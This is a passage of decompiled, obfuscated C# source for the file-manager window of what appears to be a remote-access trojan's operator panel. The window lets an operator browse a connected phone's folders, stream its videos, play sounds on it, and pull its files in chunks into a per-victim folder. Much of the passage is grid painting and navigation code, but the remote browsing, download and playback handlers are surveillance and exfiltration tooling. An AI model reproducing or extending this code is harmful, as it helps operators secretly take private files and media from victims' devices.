			if (selectedObject == null || !selectedObject.IsFile)
			{
				continue;
			}
			string text = string.Format(EXGuarder._075F6430, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
			string name = selectedObject.Name;
			object left = EXGuarder._1B1E2B75;
			if (MyRes.ISupportedVideo(name.ToLower()))
			{
				left = EXGuarder._23697005;
				flag = true;
			}
			if (Operators.ConditionalCompareObjectNotEqual(left, EXGuarder._1B1E2B75, TextCompare: false) && Btcli.isConnected)
			{
				string name2 = EXGuarder._332A542F + codes.StringToMD5(text);
				vidplayer vidplayer2 = (vidplayer)MyProject.Application.OpenForms[name2];
				if (vidplayer2 == null)
				{
					vidplayer2 = new vidplayer(text, name, Btcli.mobid, Btcli.address, Btcli.SecoundIDF, Btcli.Serverins);
					vidplayer2.Name = name2;
					vidplayer2.Show();
				}
				else
				{
					vidplayer2.TopMost = true;
					vidplayer2.TopMost = false;
				}
			}
		}
		if (!flag)
		{
			BTAlerter.infos(EXGuarder._5A414F79);
		}
	}

	private void filesmanager_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			baseloader.Enabled = false;
			baseloader.Visible = false;
			baseloader.Dispose();
			bool flag = false;
			if (DGVDATA.Rows.Count > 0)
			{
				foreach (DataGridViewRow item in (IEnumerable)DGVDATA.Rows)
				{
					if (item.Tag != null && Operators.CompareString(item.Tag.ToString(), EXGuarder._41073844, TextCompare: false) != 0)
					{
						flag = true;
						break;
					}
				}
			}
			if (flag)
			{
				if (MyMsg.Show(BTConst.confirmstr, BTConst.stoprunndwnstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._014B0D78) != DialogResult.OK)
				{
					e.Cancel = true;
					return;
				}
				foreach (DataGridViewRow item2 in (IEnumerable)DGVDATA.Rows)
				{
					if (item2.Tag != null && Operators.CompareString(item2.Tag.ToString(), EXGuarder._41073844, TextCompare: false) != 0)
					{
						string filePath = item2.Tag.ToString();
						BTClient btcli = Btcli;
						if (btcli != null)
						{
							SavePartialFile(filePath, btcli);
						}
						if (item2.Cells[0].Tag is WebSocketClient webSocketClient)
						{
							webSocketClient.Disconnect(EXGuarder._4A745073, btcli.address);
						}
					}
				}
			}
			listfilesvew.ClearObjects();
			listfilesvew.Dispose();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void SavePartialFile(string filePath, BTClient classclient)
	{
		checked
		{
			try
			{
				string key = null;
				bool flag = false;
				object obj = downloadsLock;
				ObjectFlowControl.CheckForSyncLockOnValueType(obj);
				bool lockTaken = false;
				DownloadData value = default(DownloadData);
				try
				{
					Monitor.Enter(obj, ref lockTaken);
					foreach (KeyValuePair<string, DownloadData> download in downloads)
					{
						if (string.Equals(download.Value.FilePath, filePath, StringComparison.OrdinalIgnoreCase))
						{
							value = download.Value;
							key = download.Key;
							flag = true;
							break;
						}
					}
				}
				finally
				{
					if (lockTaken)
					{
						Monitor.Exit(obj);
					}
				}
				if (!flag)
				{
					return;
				}
				object obj2 = downloadsLock;
				ObjectFlowControl.CheckForSyncLockOnValueType(obj2);
				bool lockTaken2 = false;
				List<byte[]> list;
				try
				{
					Monitor.Enter(obj2, ref lockTaken2);
					if (value.Chunks == null || value.Chunks.Count == 0)
					{
						return;
					}
					list = value.Chunks.ToList();
				}
				finally
				{
					if (lockTaken2)
					{
						Monitor.Exit(obj2);
					}
				}
				int num = 0;
				int num2 = list.Count - 1;
				for (int i = 0; i <= num2 && list[i] != null; i++)
				{
					num++;
				}
				if (num == 0)
				{
					return;
				}
				byte[] bytes = list.Take(num).SelectMany([SpecialName] (byte[] chunk) => chunk).ToArray();
				string text = Path.Combine(classclient.userfolder, EXGuarder._0E27574D);
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				string path = Path.Combine(text, value.Filename);
				File.WriteAllBytes(path, bytes);
				object obj3 = downloadsLock;
				ObjectFlowControl.CheckForSyncLockOnValueType(obj3);
				bool lockTaken3 = false;
				try
				{
					Monitor.Enter(obj3, ref lockTaken3);
					downloads.Remove(key);
				}
				finally
				{
					if (lockTaken3)
					{
						Monitor.Exit(obj3);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Console.WriteLine(EXGuarder._6A576D55 + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void PlaySoundToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count != 1 || !Btcli.isConnected)
		{
			return;
		}
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null && selectedObject.IsFile)
			{
				string newpth = string.Format(EXGuarder._73744875, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				VB_0024AnonymousType_10<string, string> data = new VB_0024AnonymousType_10<string, string>(EXGuarder._4F5C355F, newpth);
				commandfiles(data);
			}
		}
	}

	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		startdownload(EXGuarder._33781B14);
	}

	private void DownloadFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._316D4839;
		myinputs2.inputtext.Text = EXGuarder._1245170A;
		myinputs2.inputtext2.Text = EXGuarder._1245170A;
		myinputs2.inputtext2.Visible = true;
		myinputs2.checkfolder.Visible = false;
		myinputs2.inputtext.Watermark = EXGuarder._465F602A;
		myinputs2.inputtext2.Watermark = EXGuarder._2578570C;
		if (myinputs2.ShowDialog() == DialogResult.OK)
		{
			string text = myinputs2.inputtext.Text;
			string text2 = myinputs2.inputtext2.Text;
			if (codes.StrisEmpty(text) | codes.StrisEmpty(text2))
			{
				BTAlerter.infos(BTConst.enter_eml_pass);
				return;
			}
			VB_0024AnonymousType_27<string, string, object, string> data = new VB_0024AnonymousType_27<string, string, object, string>(EXGuarder._6F35183A, text, listfilesvew.Tag, text2);
			commandfiles(data);
		}
	}

	private void DataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0)
		{
			return;
		}
		e.Handled = true;
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(0, -2);
		using (SolidBrush brush = new SolidBrush(Color.FromArgb(6, 10, 15)))
		{
			e.Graphics.FillRectangle(brush, e.CellBounds);
		}
		int radius = 15;
		GraphicsPath graphicsPath = null;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			if (columnIndex == 0)
			{
				DGVDATA.Rows[e.RowIndex].Cells[0].Style.Padding = new Padding(0);
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			Color color = default(Color);
			Color color2;
			if (dataGridView.Rows[e.RowIndex].Selected)
			{
				color = Color.FromArgb(14, 22, 33);
				color2 = Color.FromArgb(2, 176, 117);
			}
			else
			{
				Color foreColor = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
				color2 = ((!foreColor.IsEmpty) ? foreColor : Color.FromArgb(145, 163, 182));
			}
			using (SolidBrush brush2 = new SolidBrush(color))
			{
				using Pen pen = new Pen(color);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			if (e.Value != null && e.Value is Image)
			{
				Image image = (Image)e.Value;
				Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
				e.Graphics.DrawImage(image, rect);
			}
			else
			{
				if (e.Value == null)
				{
					return;
				}
				if (e.Value is bool)
				{
					bool flag = Conversions.ToBoolean(e.Value);
					int num2 = 14;
					Rectangle rect2 = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - num2) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - num2) / 2), num2, num2);
					using (Pen pen2 = new Pen(color2, 2f))
					{
						e.Graphics.DrawRectangle(pen2, rect2);
					}
					if (flag)
					{
						GraphicsPath graphicsPath2 = new GraphicsPath();
						graphicsPath2.AddLines(new Point[3]
						{
							new Point(rect2.Left + 3, rect2.Top + unchecked(num2 / 2)),
							new Point(rect2.Left + unchecked(num2 / 2) - 1, rect2.Bottom - 3),
							new Point(rect2.Right - 3, rect2.Top + 3)
						});
						using Pen pen3 = new Pen(color2, 2f);
						e.Graphics.DrawPath(pen3, graphicsPath2);
					}
				}
				else
				{
					TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, cellBounds, color2, TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.WordBreak);
				}
			}
		}
	}

	private void closbtn_Click(object sender, EventArgs e)
	{
		checked
		{
			if (DGVDATA.Rows.Count > 0)
			{
				int num = DGVDATA.Rows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					try
					{
						DataGridViewRow dataGridViewRow = DGVDATA.Rows[i];
						if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Tag, EXGuarder._352A5714, TextCompare: false))
						{
							DGVDATA.Rows.Remove(dataGridViewRow);
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
				}
			}
			loadimages = false;
			listfilesvew.Items.Clear();
			filesicons.Images.Clear();
			filesicons.Dispose();
			thumbsimags.Images.Clear();
			thumbsimags.Dispose();
			refresher.Stop();
			statetimer.Stop();
			Close();
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void DrakeUIButtonIcon4_Click_1(object sender, EventArgs e)
	{
		startdownload(EXGuarder._6819752B);
	}

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
	}

	private void TableLayoutPanel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void SetActiveNav(int index)
	{
		Color color = Color.FromArgb(2, 176, 117);
		Color color2 = Color.FromArgb(145, 163, 182);
		nav1btn.ForeColor = color2;
		nav1btn.RectColor = color2;
		nav2btn.ForeColor = color2;
		nav2btn.RectColor = color2;
		nav3btn.ForeColor = color2;
		nav3btn.RectColor = color2;
		switch (index)
		{
		case 0:
			nav1btn.ForeColor = color;
			nav1btn.RectColor = color;
			break;
		case 1:
			nav2btn.ForeColor = color;
			nav2btn.RectColor = color;
			break;
		case 2:
			nav3btn.ForeColor = color;
			nav3btn.RectColor = color;
			break;
		}
	}

	private void nav1btn_Click(object sender, EventArgs e)
	{
		tabsfiles.SelectedIndex = 0;
		SetActiveNav(0);
	}

	private void nav2btn_Click(object sender, EventArgs e)
	{
		tabsfiles.SelectedIndex = 1;
		SetActiveNav(1);
	}

	private void nav3btn_Click(object sender, EventArgs e)
	{
		tabsfiles.SelectedIndex = 2;
		SetActiveNav(2);
	}

	private void shortbtn1_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._3D2A280F);
		}
	}

	private void shortbtn2_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._79030748);
		}
	}

	private void shortbtn4_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._3A69043C);
		}
	}

	private void shortbtn3_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._0F4F2641);
		}
	}

	private void shortbtn6_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._27682338);
		}
	}

	private void shortbtn5_Click(object sender, EventArgs e)
	{
		if (Btcli.isConnected)
		{
			navigateto(EXGuarder._1F1F4E5A);
		}
	}

	private void viwimage_Click(object sender, EventArgs e)
	{
		if (viwimage.Image != null)
		{
			Bitmap bitmap = new Bitmap(viwimage.Image);
			bitmap.RotateFlip(RotateFlipType.Rotate90FlipNone);
			viwimage.Image = bitmap;
		}
	}

	private void pathtxt_KeyDown(object sender, KeyEventArgs e)
	{
		e.Handled = true;
		if ((e.Control && e.KeyCode == Keys.V) || (e.Shift && e.KeyCode == Keys.Insert))
		{
			e.SuppressKeyPress = true;
		}
	}

	private void DGVFIND_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex >= 0)
		{
			DataGridViewRow dataGridViewRow = DGVFIND.Rows[e.RowIndex];
			string thepath = dataGridViewRow.Cells[0].Value?.ToString();
			if (Btcli.isConnected)
			{
				navigateto(thepath);
			}
			tabsfiles.SelectedIndex = 0;
			SetActiveNav(0);
		}
	}
}
